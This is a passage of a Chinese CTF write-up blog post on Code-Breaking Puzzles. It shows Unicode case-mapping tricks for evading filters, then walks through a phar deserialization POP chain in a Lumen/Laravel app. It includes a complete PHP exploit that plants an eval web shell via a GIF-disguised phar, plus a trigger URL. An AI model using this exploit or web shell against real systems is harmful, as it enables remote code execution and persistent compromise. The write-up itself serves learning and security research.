+<p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
+<p>可以看到，一些字符再经过upper()和lower()之后会变成字母的形式</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"ı"</span>.toUpperCase() == <span class="string">'I'</span></span><br><span class="line"><span class="string">"ſ"</span>.toUpperCase() == <span class="string">'S'</span></span><br><span class="line"><span class="string">"K"</span>.toLowerCase() == <span class="string">'k'</span></span><br></pre></td></tr></table></figure>
+<p>这样，就可以绕过select的限制，进行SQL注入了。</p>
+<h2 id="unicode大小写转换"><a href="#unicode大小写转换" class="headerlink" title="unicode大小写转换"></a>unicode大小写转换</h2><p>哎，其实之前做XSS的时候，也遇到过这个问题，但是貌似看了就忘了</p>
+<blockquote>
+<p>The special part here is the transformation behavior. Not all Unicode characters have matching representations when casted to capitals - so browsers often tend to simply take a look-alike, best-fit mapping ASCII character instead. There’s a fairly large range of characters with this behavior and all browsers do it a bit differently.</p>
+</blockquote>
+<p>翻译一下的话</p>
+<blockquote>
+<p>这里的特殊部分是转换行为。 并非所有Unicode字符在转换为大写字母时都具有匹配的表示形式 - 因此浏览器通常倾向于采用外观相似，最适合的映射ASCII字符。 这种行为有相当大范围的字符，所有浏览器的做法都有所不同。</p>
+</blockquote>
+<p>并且似乎这种特性不仅限于javascript，还有Python3，至于为什么Python2不行，似乎是默认不是Unicode的原因。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Code-Breaking-Puzzles-题解-学习篇/10.png" alt></p>
+<p>测试了Java和PHP貌似没有这个特性? 遂用Python跑了一边所有字符集。（可能没跑全？</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">K <span class="comment">---- k</span></span><br><span class="line">ß(<span class="number">223</span>) <span class="comment">---- SS</span></span><br><span class="line">ı(<span class="number">305</span>) <span class="comment">---- I</span></span><br><span class="line">ſ(<span class="number">383</span>) <span class="comment">---- S</span></span><br><span class="line">ﬀ(<span class="number">64256</span>) <span class="comment">---- FF</span></span><br><span class="line">ﬁ(<span class="number">64257</span>) <span class="comment">---- FI</span></span><br><span class="line">ﬂ(<span class="number">64258</span>) <span class="comment">---- FL</span></span><br><span class="line">ﬃ(<span class="number">64259</span>) <span class="comment">---- FFI</span></span><br><span class="line">ﬄ(<span class="number">64260</span>) <span class="comment">---- FFL</span></span><br><span class="line">ﬅ(<span class="number">64261</span>) <span class="comment">---- ST</span></span><br><span class="line">ﬆ(<span class="number">64262</span>) <span class="comment">---- ST</span></span><br></pre></td></tr></table></figure>
+<p>貌似确实只有P神提到的三个比较有用一点。（狂绕waf就完事了。。。</p>
+<h1 id="lumenserial"><a href="#lumenserial" class="headerlink" title="lumenserial"></a>lumenserial</h1><p>复现为主，学习为主。太菜了，没办法。</p>
+<h2 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h2><p>下载下来之后先<code>composer install</code>安装好依赖。</p>
+<p>然后可以看到<code>download</code>函数里有个<code>file_get_contents</code>，传入了个url，这个参数是可以通过get方式传入，完全可控的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $maxSize = <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherMaxSize'</span>];</span><br><span class="line">    $limitExtension = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ltrim($ext, <span class="string">'.'</span>);</span><br><span class="line">    &#125;, <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherAllowFiles'</span>]);</span><br><span class="line">    $allowTypes = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"image/&#123;$ext&#125;"</span>;</span><br><span class="line">    &#125;, $limitExtension);</span><br><span class="line"></span><br><span class="line">    $content = file_get_contents($url);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>然后就可以利用<code>file_get_contents</code>来进行phar反序列化，文件上传点比较好找，允许直接上传图片。</p>
+<p>当然这里只是开始。最主要的就是寻找POP链，由于是用了很多框架一起的，所以在这种情况下，寻找POP链的机会会多很多。（但是也比较难找</p>
+<p>还有一个比较重要的一点是，由于禁用了许多系统函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</span><br></pre></td></tr></table></figure>
+<p>并且php版本为7.2，也就意味着不能动态调用<code>assert</code>函数，这样的话，反序列化时可能就需要触发<code>file_put_contents</code>这些需要调用两个参数的函数。对于反序列化的要求就更为苛刻了。</p>
+<h2 id="寻找POP-Chain"><a href="#寻找POP-Chain" class="headerlink" title="寻找POP Chain"></a>寻找POP Chain</h2><p>这里主要分析一下柠檬师傅的这条php chain（貌似和rr巨佬的链是一样的。</p>
+<p>首先思路是先从<code>__destruct</code>出发，去寻找一些动态调用，然后触发到<code>__call</code>从而去触发到想要的危险函数。</p>
+<h3 id="PendingBroadcast"><a href="#PendingBroadcast" class="headerlink" title="PendingBroadcast"></a>PendingBroadcast</h3><p><code>illuminate/broadcasting/PendingBroadcast.php:55</code>里的<code>__destruct</code>看到调用了<code>events</code>的<code>dispatch</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>常规的一些类中<code>dispatch</code>里没有危险函数，那就将目光转向一些类的<code>__call</code>方法。</p>
+<h3 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h3><p><code>fzaninotto/faker/src/Faker/ValidGenerator.php:52</code>里的<code>__call</code>方法调用了个两个动态调用函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $res = call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;generator, $name), $arguments);</span><br><span class="line">        $i++;</span><br><span class="line">        <span class="keyword">if</span> ($i &gt; <span class="keyword">$this</span>-&gt;maxRetries) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \OverflowException(sprintf(<span class="string">'Maximum retries of %d reached without finding a valid value'</span>, <span class="keyword">$this</span>-&gt;maxRetries));</span><br><span class="line">        &#125;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;validator);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        var_dump($res);</span><br><span class="line">    &#125; <span class="keyword">while</span> (!call_user_func(<span class="keyword">$this</span>-&gt;validator, $res));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里传入的<code>$name</code>是不可控的，为传入的<code>dispatch</code>，这样第一次的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res = call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;generator, $name), $arguments);</span><br></pre></td></tr></table></figure>
+<p>意味着暂时也无法完全控制，但是需要找一个可以类，可以控制其返回值，从而让<code>$res</code>可控，进而while处的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">$this</span>-&gt;validator, $res)</span><br></pre></td></tr></table></figure>
+<p><strong>需要特别注意</strong>的一点是，这里的<code>$arguments</code>通过之前的<code>__call</code>方法传入的时候，变成了一个数组，并且只能控制第一个索引的数组，所以有一定的限制。（一开始绕了好久</p>
+<h3 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h3><p><code>fzaninotto/faker/src/Faker/Generator.php:277</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>format()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>getFormatter()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>__call</code>处的<code>$method</code>不可控，这样就不能控制<code>format()</code>中的<code>$formatter</code></p>
+<p>庆幸的是在<code>getFormatter()</code>中<code>$this-&gt;formatters</code>是可以通过反序列化控制的，这样，就可以传入一个我们想要的数组，然后触发对应类的函数。</p>
+<p>然后由于<code>$arguments</code>的原因，现在的pop链还不算特别好。这里选择了在<code>Generator</code>类中再次调用<code>Generator</code>类，嵌套调用。（真的给跪了。。。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$g2-&gt;formatters = <span class="keyword">array</span>(<span class="string">'kingkk'</span> =&gt; $evalobj);</span><br><span class="line">$g1-&gt;formatters = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"dispatch"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        $g2, </span><br><span class="line">        <span class="string">"getFormatter"</span>,</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>第一次先通过g1调用g2中的<code>getFormatter</code>，然后这是时候就可以通过g2的<code>getFormatter()</code>返回其他任意类，控制<code>ValidGenerator</code>中的<code>$res</code>。</p>
+<p>（g1和g2只是类中变量不同的两个<code>Gennerator</code>类。这里确实满饶的，理了好久。。</p>
+<p>可以返回任意类时就需要找一个比较好一点的类。</p>
+<h3 id="StaticInvocation"><a href="#StaticInvocation" class="headerlink" title="StaticInvocation"></a>StaticInvocation</h3><p><code>phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invoke</span><span class="params">(Invocation $invocation)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> \call_user_func_array(<span class="keyword">$this</span>-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里调用了<code>call_user_func_array</code>并且两个参数都是反序列化可控的。由于<code>Invocation</code>只是个接口。找到具体的实现类即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticInvocation</span> <span class="keyword">implements</span> <span class="title">Invocation</span>, <span class="title">SelfDescribing</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getMethodName</span><span class="params">()</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;methodName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>返回这个类，最后通过<code>ValidGenerator</code>中的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (!call_user_func(<span class="keyword">$this</span>-&gt;validator, $res));</span><br></pre></td></tr></table></figure>
+<p>完全全部攻击链</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>根据之前的分析，就可以写出EXP</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: King kaki</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2018-12-03 20:48:26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified by:   King kaki</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified time: 2018-12-04 21:18:08</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">		<span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">			$<span class="title">this</span>-&gt;<span class="title">events</span> = <span class="title">new</span> \<span class="title">Faker</span>\<span class="title">ValidGenerator</span>();</span><br><span class="line">			<span class="keyword">$this</span>-&gt;event = <span class="string">'kingkk'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line">		<span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">			$this-&gt;parameters = array('/var/www/html/upload/k.php','&lt;?php phpinfo();eval($_POST["k"]);?&gt;');</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">ReturnCallback</span>&#123;</span><br><span class="line">		<span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">			$this-&gt;callback = 'file_put_contents';</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">ValidGenerator</span>&#123;</span><br><span class="line">		<span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">			$<span class="title">si</span> = <span class="title">new</span> \<span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>\<span class="title">StaticInvocation</span>();</span><br><span class="line">			$g1 = <span class="keyword">new</span> \Faker\Generator(<span class="keyword">array</span>(<span class="string">'kingkk'</span> =&gt; $si ));</span><br><span class="line">			$g2 = <span class="keyword">new</span> \Faker\Generator(<span class="keyword">array</span>(<span class="string">"dispatch"</span> =&gt; <span class="keyword">array</span>($g1, <span class="string">"getFormatter"</span>)));</span><br><span class="line"></span><br><span class="line">			$rc = <span class="keyword">new</span> \PHPUnit\Framework\MockObject\Stub\ReturnCallback();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">$this</span>-&gt;validator = <span class="keyword">array</span>($rc, <span class="string">"invoke"</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;generator = $g2;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;maxRetries = <span class="number">10000</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($form)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $form;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	$<span class="title">exp</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">PendingBroadcast</span>();</span><br><span class="line">	print_r(urlencode(serialize($exp)));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// phar</span></span><br><span class="line">	$p = <span class="keyword">new</span> Phar(<span class="string">'./k.phar'</span>, <span class="number">0</span>);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">    $p-&gt;setMetadata($exp);</span><br><span class="line">    $p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后就是上传一波图片，图片地址在返回的json数据中就能看到。再利用一开始的<code>file_get_contents</code>触发反序列化链即可。</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source</span>[<span class="string"></span>]=phar:///var/www/html/upload/image/xxx.gif</span><br></pre></td></tr></table></figure>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>最后，学习了。中间分析的过程尤其是两次<code>Generator</code>的调用，是有点晕，差点没转过弯来。膜柠檬师傅。</p>
+<p>感觉随着phar的火爆，在利用框架写的系统中，反序列化会愈发频繁，寻找pop chain也会是一种比较重要的能力。而且随着一些函数禁用和php版本的原因，寻找这种<code>call_user_func_array</code>的调用确实也是一种实际需求。</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</a></p>
+<p><a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">http://blog.51cto.com/lovexm/1743442</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
+<p><a href="http://www.laruence.com/2010/06/08/1579.html" target="_blank" rel="noopener">http://www.laruence.com/2010/06/08/1579.html</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p><a href="https://www.cnblogs.com/iamstudy/articles/code_breaking_writeup.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/code_breaking_writeup.html</a></p>
+<p><a href="https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2019/01/Java反序列之从萌新到菜鸟/" data-toggle="tooltip" data-placement="top" title="Java反序列之从萌新到菜鸟">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/11/2018-lctf-web-学习篇/" data-toggle="tooltip" data-placement="top" title="2018 lctf-web 学习篇">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#代码审计" title="代码审计">代码审计</a>
+                        
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
